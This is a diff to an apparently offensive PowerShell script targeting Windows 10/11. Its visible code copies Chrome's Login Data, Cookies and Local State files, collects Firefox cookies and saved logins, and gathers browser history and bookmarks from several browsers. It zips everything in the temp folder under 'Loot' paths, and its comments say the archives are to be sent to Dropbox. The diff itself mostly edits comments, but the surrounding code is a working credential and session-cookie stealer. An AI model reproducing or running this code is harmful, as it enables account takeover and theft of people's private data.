@@ -8,6 +8,10 @@
 # Target: Windows 10/11
 # Version: 1.0
 # 
+#------------------------------------------------------------------------------------------------------------------------------------
+#
+# Google Chrome - copy Login Data, Cookies, and Local State files and add them to a new folder called Google-UserData
+# then zip that folder to be ready to send to dropbox
 
 $GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
@@ -18,8 +22,6 @@ $GdestinationPath = "/Loot/$env:USERNAME/Google-UserData.zip"
 
 mkdir $env:tmp\Google-UserData
 
-#------------------------------------------------------------------------------------------------------------------------------------
-
 Copy-Item -Path $GcookiesPath -Destination $GoogleFolderPath -Force
 Copy-Item -Path $GLoginPath -Destination $GoogleFolderPath -Force
 Copy-Item -Path $GLocalStatePath -Destination $GoogleFolderPath - Force
@@ -27,7 +29,8 @@ Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath
 
 #------------------------------------------------------------------------------------------------------------------------------------
 #
-# This section will search for firefox cookies and saved logins and place them in a folder in the tmp directory then zip the file to be sent to dropbox
+# This section will search for firefox cookies and saved logins and place them in a folder in the tmp directory 
+# then zip the file to be sent to dropbox
 #
 
 $SearchPath = "C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles"
@@ -66,6 +69,10 @@ if ($Results) {
 Compress-Archive -Path "$env:tmp\Firefox-UserData" -DestinationPath "$env:tmp\Firefox-UserData.zip"
 
 #---------------------------------------------------------------------------------------------------------------------------------------
+#
+# This section will grab browser history and bookmarks from Chrome, Edge, Firefox, and Opera and save those in a file call --BrowserData.txt 
+# in the temp directory
+#
 
 $BfilePath = "$env:tmp\--BrowserData.txt"
 $BdestinationPath = "/Loot/$env:USERNAME/--BrowserData.txt"
